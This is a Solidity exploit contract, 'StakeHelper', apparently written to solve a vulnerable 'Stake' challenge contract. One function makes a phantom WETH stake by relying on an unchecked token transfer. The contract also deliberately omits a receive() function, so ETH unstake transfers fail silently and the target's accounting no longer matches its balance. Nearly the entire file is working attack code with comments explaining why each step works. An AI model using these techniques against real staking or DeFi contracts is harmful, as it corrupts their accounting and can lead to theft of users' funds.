// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title StakeHelper
 * @notice Helper contract to exploit the Stake vulnerability
 * 
 * Two-part exploit:
 * 1. Phantom WETH stake - increases totalStaked without adding ETH
 * 2. Stake real ETH, then try to unstake - unstake FAILS (no receive),
 *    so totalStaked decreases but ETH balance stays in Stake contract!
 */

interface IStake {
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function UserStake(address user) external view returns (uint256);
    function WETH() external view returns (address);
}

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract StakeHelper {
    IStake public stake;
    IWETH public weth;
    
    constructor(address _stake) {
        stake = IStake(_stake);
        weth = IWETH(stake.WETH());
    }
    
    /**
     * @notice Perform phantom WETH stake
     * @dev Approves and calls StakeWETH without actually having WETH tokens.
     *      The Stake contract doesn't verify the transfer succeeded!
     */
    function phantomStake(uint256 amount) external {
        weth.approve(address(stake), amount);
        stake.StakeWETH(amount);
    }
    
    /**
     * @notice Stake real ETH
     */
    function stakeETH() external payable {
        require(msg.value > 0.001 ether, "Need > 0.001 ETH");
        stake.StakeETH{value: msg.value}();
    }
    
    /**
     * @notice Try to unstake - this will FAIL because we have no receive()
     * @dev The Stake contract will decrement totalStaked and UserStake,
     *      but the ETH transfer will fail silently. The ETH stays in Stake!
     */
    function tryUnstake() external {
        uint256 myStake = stake.UserStake(address(this));
        if (myStake > 0) {
            stake.Unstake(myStake);
        }
    }
    
    // NO receive() function - this is intentional!
    // When Stake tries to send us ETH, it fails, but the ETH stays in Stake
}
